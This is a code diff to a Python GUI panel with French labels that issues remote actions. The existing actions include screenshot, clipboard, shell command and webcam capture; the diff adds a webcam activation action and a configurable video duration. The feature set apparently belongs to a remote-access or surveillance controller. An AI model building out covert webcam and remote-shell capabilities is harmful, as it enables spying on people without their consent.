@@ -35,6 +35,7 @@ ACTIONS: dict[str, list] = {
     ],
     "screen": [
         {"id": "screenshot", "icon": "📷", "label": "Capture ecran", "desc": "Screenshot distant"},
+        {"id": "webcam_activate", "icon": "📹", "label": "Activer webcam", "desc": "Verifier et initialiser la webcam"},
         {"id": "webcam_photo", "icon": "📸", "label": "Photo webcam", "desc": "Prendre une photo"},
         {"id": "webcam_video", "icon": "🎥", "label": "Video webcam", "desc": "Enregistrer une video"},
         {"id": "clipboard", "icon": "📋", "label": "Presse-papiers", "desc": "Contenu du clipboard"},
@@ -75,6 +76,7 @@ NEED_PARAM = {
     "dns_lookup": ("Resolution DNS", "Nom de domaine", "host"),
     "ping_target": ("Ping", "Adresse IP ou domaine", "host"),
     "shell": ("Executer une commande shell", "Commande a executer", "cmd"),
+    "webcam_video": ("Video webcam", "Duree en secondes (2-20)", "duration"),
 }
 
 
@@ -394,10 +396,6 @@ class ActionsPanel(ctk.CTkFrame):
             self._refresh_current_dir()
             return
 
-        if action_id == "webcam_video":
-            self._execute("webcam_video", {"duration": 6, "fps": 10})
-            return
-
         if action_id in NEED_PARAM:
             title, prompt, key = NEED_PARAM[action_id]
             self._ask_param(title, prompt, lambda v, aid=action_id, k=key: self._execute(aid, {k: v}))
@@ -599,10 +597,15 @@ class ActionsPanel(ctk.CTkFrame):
 
         self._set_status(f"Resultat recu : {action_label}")
 
-        if action_id in ("screenshot", "webcam_photo"):
+        if action_id in ("screenshot", "webcam_activate", "webcam_photo"):
             b64 = data.get("screenshot")
             if b64:
-                title = "Capture ecran" if action_id == "screenshot" else "Photo webcam"
+                if action_id == "screenshot":
+                    title = "Capture ecran"
+                elif action_id == "webcam_activate":
+                    title = "Webcam activee"
+                else:
+                    title = "Photo webcam"
                 self._show_image(b64, title)
                 return
 
